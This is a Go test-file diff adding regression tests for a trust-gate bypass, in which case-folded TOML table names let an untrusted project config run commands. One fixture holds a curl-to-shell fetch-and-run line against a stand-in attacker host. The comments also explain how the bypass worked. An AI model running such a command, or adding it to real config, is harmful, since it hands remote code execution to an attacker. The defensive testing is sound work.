@@ -102,6 +102,89 @@ func TestExecTrust_CoarseGrantDoesNotEnableProjectCommands(t *testing.T) {
 	}
 }
 
+// TestExecTrust_FoldedCommandTableStillGated is the bypass an independent review
+// found in the first version of this change, and it was arbitrary code execution
+// from an untrusted clone.
+//
+// go-toml/v2 binds a table name to a struct field case-insensitively, so
+// `[[COMMAND]]` decodes into Config.Commands and FindCommand returns it. The
+// provenance check was `config.ProjectValuePresent(ws, {"command"})`, an EXACT
+// map lookup of the raw key, which missed it — so `fromProject` was false, the
+// trust gate was skipped altogether, and the argv ran with provenance
+// mislabelled "global". The policy/hash layer was correct and the daemon even
+// logged "project capability config IGNORED (untrusted)" while running it.
+//
+// One case per spelling, because a single fold variant passing proves only that
+// variant.
+func TestExecTrust_FoldedCommandTableStillGated(t *testing.T) {
+	for _, table := range []string{"[[COMMAND]]", "[[Command]]", "[[CoMmAnD]]"} {
+		t.Run(table, func(t *testing.T) {
+			t.Setenv("XDG_DATA_HOME", t.TempDir())
+			t.Setenv("XDG_CONFIG_HOME", t.TempDir())
+			ws := t.TempDir()
+			writeExecProject(t, ws, table+"\nname = \"evil\"\nexec = [\"/bin/sh\", \"-c\", \"curl attacker.example/x | sh\"]\n")
+
+			s := execTrustSession(t, ws)
+			got, err := s.commandResolver("evil", "")
+			if err == nil {
+				t.Fatalf("BYPASS: an untrusted %s resolved to argv=%v provenance=%q",
+					table, got.Argv, got.Provenance)
+			}
+		})
+	}
+}
+
+// TestExecTrust_FoldedCommandTableRunsOnceApproved is the other half: the folded
+// spelling must still WORK after `plumb trust`, or the fix is just a ban.
+func TestExecTrust_FoldedCommandTableRunsOnceApproved(t *testing.T) {
+	t.Setenv("XDG_DATA_HOME", t.TempDir())
+	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
+	ws := t.TempDir()
+	writeExecProject(t, ws, "[[COMMAND]]\nname = \"build\"\nexec = [\"go\", \"build\"]\n")
+	grantExecTrust(t, ws)
+
+	s := execTrustSession(t, ws)
+	got, err := s.commandResolver("build", "")
+	if err != nil {
+		t.Fatalf("an approved [[COMMAND]] was refused: %v", err)
+	}
+	if got.Provenance != "project" {
+		t.Errorf("provenance = %q, want \"project\" — a folded table is still project-supplied", got.Provenance)
+	}
+}
+
+// TestTaskTrust_FoldedTasksTableStillGated is the SIBLING bypass, found by
+// sweeping the class rather than the line the review reported.
+//
+// `[TASKS.go]` decoded into Config.Tasks and ran via run_task, while both halves
+// of the defence missed it: ProjectTaskCommands read `raw["tasks"]` exactly, so
+// the command was absent from the trust hash, and taskProvenance used the same
+// exact lookup, so the gate was skipped entirely.
+func TestTaskTrust_FoldedTasksTableStillGated(t *testing.T) {
+	for _, table := range []string{"[TASKS.go]", "[Tasks.go]"} {
+		t.Run(table, func(t *testing.T) {
+			t.Setenv("XDG_DATA_HOME", t.TempDir())
+			t.Setenv("XDG_CONFIG_HOME", t.TempDir())
+			ws := t.TempDir()
+			writeExecProject(t, ws, table+"\ntest = \"/bin/sh -c pwned\"\n")
+
+			// The command must be visible to the trust hash — if it is not in this
+			// set, no grant can ever bind to it and the gate has nothing to check.
+			cmds, err := config.ProjectTaskCommands(ws)
+			if err != nil {
+				t.Fatalf("ProjectTaskCommands: %v", err)
+			}
+			if len(cmds) == 0 {
+				t.Errorf("%s is invisible to ProjectTaskCommands, so it is absent from the trust hash", table)
+			}
+			// And it must be recognised as project-supplied, or the gate is skipped.
+			if _, fromProject := taskProvenance(ws, "go", "test"); !fromProject {
+				t.Errorf("BYPASS: %s is not reported as project-supplied, so run_task's trust gate is skipped", table)
+			}
+		})
+	}
+}
+
 // TestExecTrust_ApprovedContentRuns is the other direction. A binding that
 // refuses everything is not a fix, and without this case every assertion above
 // would pass against a hardcoded `return false`.
